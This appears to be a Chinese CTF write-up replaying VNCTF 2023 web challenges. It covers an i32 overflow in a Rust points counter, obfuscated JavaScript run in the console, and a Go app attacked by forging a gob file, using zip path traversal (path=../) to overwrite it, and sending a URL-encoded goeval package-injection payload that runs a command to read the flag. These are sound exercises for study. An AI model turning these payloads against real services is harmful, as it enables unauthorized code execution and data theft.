# 【电子木鱼】
给了源码，是Rust语言写的一个功德计算的程序，功德大于十亿得到flag
`/upgrade`路由通过传入的`body.name`变量对`GONGDE`进行各种操作，`PAYLOADS`数组变量包含五个不同的Payload结构体，`name`分别对应不同的操作
主要源码：
```rust
const PAYLOADS: &[Payload] = &[
    Payload {
        name: "Cost",
        cost: 10,
    },
    Payload {
        name: "Loan",
        cost: -1_000,
    },
    Payload {
        name: "CCCCCost",
        cost: 500,
    },
    Payload {
        name: "Donate",
        cost: 1,
    },
    Payload {
        name: "Sleep",
        cost: 0,
    },
];
 
#[post("/upgrade")]
async fn upgrade(body: web::Form<Info>) -> Json<APIResult> {
    if GONGDE.get() < 0 {
        return web::Json(APIResult {
            success: false,
            message: "功德都搞成负数了，佛祖对你很失望",
        });
    }
 
    if body.quantity <= 0 {
        return web::Json(APIResult {
            success: false,
            message: "佛祖面前都敢作弊，真不怕遭报应啊",
        });
    }
 
    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
        let mut cost = payload.cost;
 
        if payload.name == "Donate" || payload.name == "Cost" {
            cost *= body.quantity;
        }
 
        if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }
 
        if cost != 0 {
            GONGDE.set(GONGDE.get() - cost as i32);
        }
 
...
 
        }
    }
 
    web::Json(APIResult {
        success: false,
        message: "禁止开摆",
    })
}
```
存在漏洞的主要是这里：
```rust
if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }
```
如果`cost`变量能够为负数，那么就能够加`GONGDE`，但问题是后端对传入的`body.quantity`进行了校验，而Rust作为一种安全性较高的语言，又很难绕过校验。

注意到后端对`cost`的数值类型限定为32位int，那么就有可能存在整型溢出漏洞。如果直接传入`2147483648`后端会报错。但由于cost进行了乘法操作`cost *= body.quantity;`，当`body.name=Cost`时，`cost`变量默认为`10`，因此我们传入`body.quantity=214748365`，乘法操作后cost就会变为`2147483650`，int32下会溢出为负数。
`（i32 能表示的最大值是2 147 483 647）`

通过这段代码扣钱：
```rust
if cost != 0 {

            GONGDE.set(GONGDE.get() - cost as i32);

        }
```
只要cost为一个很大的负数，我们就可以给GONGDE加很多了。所以才需要对整数溢出，`rust`中对超过最大值的数会从负的最大值开始`'环绕'` .也就是`2147483648`会等于`-2147483648`。因为int32：`最大：2147483647 最小：-2147483648`。
payload:
`post传：name=Cost&quantity=214748365`.
# 【象棋王子】
翻一下js文件，发现fuckjs代码：
![](assets/VNCTF%20%202023%20web%20复现/file-20251203193025605.png)
到控制台执行
![500](assets/VNCTF%20%202023%20web%20复现/file-20251203193025617.png)
	# 【BabyGo】
给了附件，是go语言源码，看不太懂就叫ai分析了。
```go
package main

import (
	"encoding/gob"
	"fmt"
	"github.com/PaulXu-cn/goeval"
	"github.com/duke-git/lancet/cryptor"
	"github.com/duke-git/lancet/fileutil"
	"github.com/duke-git/lancet/random"
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

type User struct {
	Name  string
	Path  string
	Power string
}

func main() {
	r := gin.Default()
	store := cookie.NewStore(random.RandBytes(16))
	r.Use(sessions.Sessions("session", store))
	r.LoadHTMLGlob("template/*")

	r.GET("/", func(c *gin.Context) {
		userDir := "/tmp/" + cryptor.Md5String(c.ClientIP()+"VNCTF2023GoGoGo~") + "/"
		session := sessions.Default(c)
		session.Set("shallow", userDir)
		session.Save()
		fileutil.CreateDir(userDir)
		gobFile, _ := os.Create(userDir + "user.gob")
		user := User{Name: "ctfer", Path: userDir, Power: "low"}
		encoder := gob.NewEncoder(gobFile)
		encoder.Encode(user)
		if fileutil.IsExist(userDir) && fileutil.IsExist(userDir+"user.gob") {
			c.HTML(200, "index.html", gin.H{"message": "Your path: " + userDir})
			return
		}
		c.HTML(500, "index.html", gin.H{"message": "failed to make user dir"})
	})

	r.GET("/upload", func(c *gin.Context) {
		c.HTML(200, "upload.html", gin.H{"message": "upload me!"})
	})

	r.POST("/upload", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		fileutil.CreateDir(userUploadDir)
		file, err := c.FormFile("file")
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "no file upload"})
			return
		}
		ext := file.Filename[strings.LastIndex(file.Filename, "."):]
		if ext == ".gob" || ext == ".go" {
			c.HTML(500, "upload.html", gin.H{"message": "Hacker!"})
			return
		}
		filename := userUploadDir + file.Filename
		if fileutil.IsExist(filename) {
			fileutil.RemoveFile(filename)
		}
		err = c.SaveUploadedFile(file, filename)
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "failed to save file"})
			return
		}
		c.HTML(200, "upload.html", gin.H{"message": "file saved to " + filename})
	})

	r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})

	r.GET("/backdoor", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userDir := session.Get("shallow").(string)
		if fileutil.IsExist(userDir + "user.gob") {
			file, _ := os.Open(userDir + "user.gob")
			decoder := gob.NewDecoder(file)
			var ctfer User
			decoder.Decode(&ctfer)
			if ctfer.Power == "admin" {
				eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
				if err != nil {
					fmt.Println(err)
				}
				c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
				return
			} else {
				c.HTML(200, "backdoor.html", gin.H{"message": "low power"})
				return
			}
		} else {
			c.HTML(500, "backdoor.html", gin.H{"message": "no such user gob"})
			return
		}
	})

	r.Run(":80")
}

```
一共有五个路由(包括`/uploads`)
## `/ `路由
```go
r.GET("/", func(c *gin.Context) {
		userDir := "/tmp/" + cryptor.Md5String(c.ClientIP()+"VNCTF2023GoGoGo~") + "/"
		session := sessions.Default(c)
		session.Set("shallow", userDir)
		session.Save()
		fileutil.CreateDir(userDir)
		gobFile, _ := os.Create(userDir + "user.gob")
		user := User{Name: "ctfer", Path: userDir, Power: "low"}
		encoder := gob.NewEncoder(gobFile)
		encoder.Encode(user)
		if fileutil.IsExist(userDir) && fileutil.IsExist(userDir+"user.gob") {
			c.HTML(200, "index.html", gin.H{"message": "Your path: " + userDir})
			return
		}
		c.HTML(500, "index.html", gin.H{"message": "failed to make user dir"})
	})
```
* md5加ip，设置了一段临时的用户目录
* 写入了初始的`user.gob`,`User{Name: "ctfer", Path: userDir, Power: "low"}`
## `/upload` 路由
```go
r.GET("/upload", func(c *gin.Context) { ... })

r.POST("/upload", func(c *gin.Context) {
    session := sessions.Default(c)
    if session.Get("shallow") == nil {
        c.Redirect(http.StatusFound, "/")
    }
    userUploadDir := session.Get("shallow").(string) + "uploads/"
    fileutil.CreateDir(userUploadDir)
    file, err := c.FormFile("file")
    if err != nil {
        c.HTML(500, "upload.html", gin.H{"message": "no file upload"})
        return
    }
    ext := file.Filename[strings.LastIndex(file.Filename, "."):]
    if ext == ".gob" || ext == ".go" {
        c.HTML(500, "upload.html", gin.H{"message": "Hacker!"})
        return
    }
    filename := userUploadDir + file.Filename
    if fileutil.IsExist(filename) {
        fileutil.RemoveFile(filename)
    }
    err = c.SaveUploadedFile(file, filename)
    if err != nil {
        c.HTML(500, "upload.html", gin.H{"message": "failed to save file"})
        return
    }
    c.HTML(200, "upload.html", gin.H{"message": "file saved to " + filename})
})

```
* 用户上传文件，保存在 `.../uploads/`。禁止 `.gob` 和 `.go` 扩展名的直接上传。
## `/unzip` 路由
```go
r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})
```
* 只有登录 Session 才能继续。
*  读取当前用户的上传目录 `/tmp/<hash>/uploads/`
- 找到所有 MIME 为 zip 的文件
- 读取 URL 参数 `path`，构造解压目标路径：
	`destPath = Clean(uploadDir + path)`
- 对每个 zip 文件执行解压到 destPath
- 解压完成后把 zip 删除
## `/backdoor` 路由
```go
r.GET("/backdoor", func(c *gin.Context) {
    session := sessions.Default(c)
    if session.Get("shallow") == nil {
        c.Redirect(http.StatusFound, "/")
    }
    userDir := session.Get("shallow").(string)
    if fileutil.IsExist(userDir + "user.gob") {
        file, _ := os.Open(userDir + "user.gob")
        decoder := gob.NewDecoder(file)
        var ctfer User
        decoder.Decode(&ctfer)
        if ctfer.Power == "admin" {
            eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
            if err != nil {
                fmt.Println(err)
            }
            c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
            return
        } else {
            c.HTML(200, "backdoor.html", gin.H{"message": "low power"})
            return
        }
    } else {
        c.HTML(500, "backdoor.html", gin.H{"message": "no such user gob"})
        return
    }
})

```
* 这里就是会反序列化 `user.gob文件`

## 漏洞分析
* 我们把路由都分析一遍后就有一条攻击思路了。一开始的`user.gob`文件中的`Power="low"`,但是我们可以上传文件，那我们就像是不是可以手动伪造一个`user.gob`文件，改成`Power="admin"`呢。

* 因为我们注意到这里
```go
if ctfer.Power == "admin" {
            eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
            if err != nil {
                fmt.Println(err)
            }
            c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
            return
        }
```
只要`Powe="admin"`,我们就可以eval执行命令了。

* 但是文件上传页面是禁止我们上传`.gob`文件的，此时我们想到还有一个`/unzip`路由。可以把`/uploads`下的`zip`文件解压到我们指定的目录。其实他是会解压到`/uploads`目录下的，但是我们可以目录穿越,`path=../`。来指定目录。这样我们就能将`user.gob`文件覆盖了。
## 攻击
1. 制作zip压缩包
首先我们根据源码写生成`user.gob`文件的脚本。
```go
	package main
 
import (
	"encoding/gob"
	"github.com/duke-git/lancet/fileutil"
	"os"
)
 
type User struct {
	Name  string
	Path  string
	Power string
}
 
func main()  {
	userDir := "./serial/"
	fileutil.CreateDir(userDir)
	gobFile, _ := os.Create(userDir + "user.gob")
	user := User{Name: "ctfer", Path: userDir, Power: "admin"}
	encoder := gob.NewEncoder(gobFile)
	encoder.Encode(user)
 
}
	```
   
这里要下载一些模块什么的就叫ai帮忙了，总之运行脚本会得到一个文件。

![](assets/VNCTF%20%202023%20web%20复现/file-20251205162925828.png)
（这里面的`zip`包是后来手动打包的）

2. 文件上传 
我们来到`/upload`路由。
上传我们的zip
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163137388.png)
3. 解压缩文件
访问`/unzip`路由，path路径指定`../`上级目录。
注意这里一开始没有指定path路径的话会默认解压到`/uploads`目录下，此时还会吧zip删除。所以第一次没操作好需要重新上传。
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163454802.png)
4. 访问反序列化路由
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163525736.png)
显示good说明覆盖成功。
5. 命令执行
这里我没怎么懂，但是就是很复杂的命令拼接，因为会把`/backdoor`路由下的`?pkg`参数拼接到命令执行函数中。
答案是：
```
"os/exec" fmt" )

func init(){ cmd:=exec.Command("cat","/ffflllaaaggg") out,_:=cmd.CombinedOutput() fmt.Println(string(out)) }

var(a="1
```
把这段url编码后传入。
```http
?pkg=%22os%2Fexec%22%0A%20fmt%22%0A%29%0A%0Afunc%09init()%7B%0Acmd%3A%3Dexec.Command(%22cat%22%2C%22%2Fffflllaaaggg%22)%0Aout%2C_%3A%3Dcmd.CombinedOutput()%0Afmt.Println(string(out))%0A%7D%0A%0Avar(a%3D%221
```
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163820848.png)
